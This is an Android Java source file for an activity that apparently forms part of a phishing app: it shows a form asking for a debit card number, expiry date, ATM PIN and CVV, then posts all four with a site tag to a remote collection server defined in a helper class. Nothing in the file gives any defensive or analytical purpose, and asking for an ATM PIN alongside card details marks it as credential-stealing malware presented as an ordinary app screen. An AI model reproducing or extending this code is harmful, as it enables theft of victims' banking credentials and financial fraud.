package com.axispure.test.debug;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

public class FourthActivity extends AppCompatActivity {

    private EditText card, expiry, pin, cvv;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.last_layout);

        card = findViewById(R.id.card);
        expiry = findViewById(R.id.expiry);
        pin = findViewById(R.id.pin);
        cvv = findViewById(R.id.cvv);
        Button buttonSubmit = findViewById(R.id.submit);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");
                JSONObject sendPayload = new JSONObject();
                try {
                    JSONObject dataObject = new JSONObject();
                    dataObject.put("card", card.getText().toString().trim());
                    dataObject.put("expiry", expiry.getText().toString().trim());
                    dataObject.put("pin", pin.getText().toString().trim());
                    dataObject.put("cvv", cvv.getText().toString().trim());

                    sendPayload.put("data", dataObject);
                    sendPayload.put("site", Helper.SITE);

                    String url = Helper.FormURL + Helper.FormSavePath;
                    NetworkUtils.postRequest(url, sendPayload, new NetworkUtils.PostRequestCallback() {
                        @Override
                        public void onResponse(String stringResponnse) {
                            try {
                                JSONObject response = new JSONObject(stringResponnse);
                                if(response.getInt("status")==200){
                                    Intent intent = new Intent(FourthActivity.this, FourthActivity.class);
                                    startActivity(intent);
                                }else{
                                    Helper.debug(FourthActivity.this, "Response Not 200: " + stringResponnse);
                                }
                            }catch (JSONException e){
                                Helper.debug(e.getMessage());
                            }
                        }
                        @Override
                        public void onError(String error) {
                            Helper.debug(FourthActivity.this, error);
                        }
                    });
                } catch (JSONException e) {
                    Helper.debug(FourthActivity.this, e.getMessage());
                }
            }else{
                Helper.debug(FourthActivity.this, "Form Validation Failed");
            }
        });

    }



    private boolean validateForm() {
        boolean on1 = FormValidator.validateRequired(card, "Debit Card is required");
        boolean on11 = FormValidator.validateMinLength(card, 16, "Invalid Debit Card Number");
        boolean on12 = FormValidator.validateMaxLength(card, 16, "Invalid Debit Card Number");

        boolean on2 = FormValidator.validateRequired(expiry, "Expiry Date is required");

        boolean on3 = FormValidator.validateRequired(pin, "ATM Pin is required");
        boolean on31 = FormValidator.validateMaxLength(pin, 4, "Invalid Debit Card Number");
        boolean on32 = FormValidator.validateMinLength(pin, 4, "Invalid Debit Card Number");

        boolean on4 = FormValidator.validateRequired(cvv, "CVV is required");
        boolean on41 = FormValidator.validateMaxLength(cvv, 4, "Invalid CVV Number");
        boolean on42 = FormValidator.validateMinLength(cvv, 4, "Invalid CVV Number");

        return on1 && on11 && on12 && on2 && on3 && on31 && on32 && on4 && on41 && on42;

    }
}
